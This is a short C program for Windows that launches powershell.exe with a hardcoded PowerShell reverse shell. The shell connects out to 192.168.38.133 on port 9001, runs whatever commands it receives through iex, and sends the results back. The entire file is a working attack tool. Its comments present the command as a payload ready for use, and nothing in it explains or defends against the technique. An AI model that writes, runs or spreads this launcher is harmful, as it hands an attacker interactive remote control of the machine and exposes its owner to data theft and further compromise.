#include <stdio.h>
#include <windows.h>
#include <processthreadsapi.h>
#define _WIN32_WINNT 0x0A00

int main() {
	//Deffine Application & PS command you want to execute
	LPCWSTR power = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
	LPCWSTR comm = L"-Command \"$client = New-Object System.Net.Sockets.TCPClient('192.168.38.133',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";

	//Process Information Structure;


	STARTUPINFO start_info;
	PROCESS_INFORMATION proc_info;
	ZeroMemory(&start_info, sizeof(start_info));
	start_info.cb = sizeof(start_info);
	ZeroMemory(&proc_info, sizeof(proc_info));

	//Design Mutable Buffer so CreateProcess can apply changes to command
	wchar_t mutableBuffer[2048];
	wcscpy_s(mutableBuffer, sizeof(mutableBuffer) / sizeof(mutableBuffer[0]), comm);

	//Create the PS process
	if (CreateProcessW(power, mutableBuffer, NULL, NULL, FALSE, 0, NULL, NULL, &start_info, &proc_info)) {

		//PS process -- waiting to finish
		WaitForSingleObject(proc_info.hProcess, INFINITE);

		//Close Process and thread handles
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
	}
	else {
		// Handle: CreateProcess Fails
		//Print error message 
		printf("Failed to execute PS Command. Error %d\n", GetLastError());
		return 1;
	}

	return 0;

}
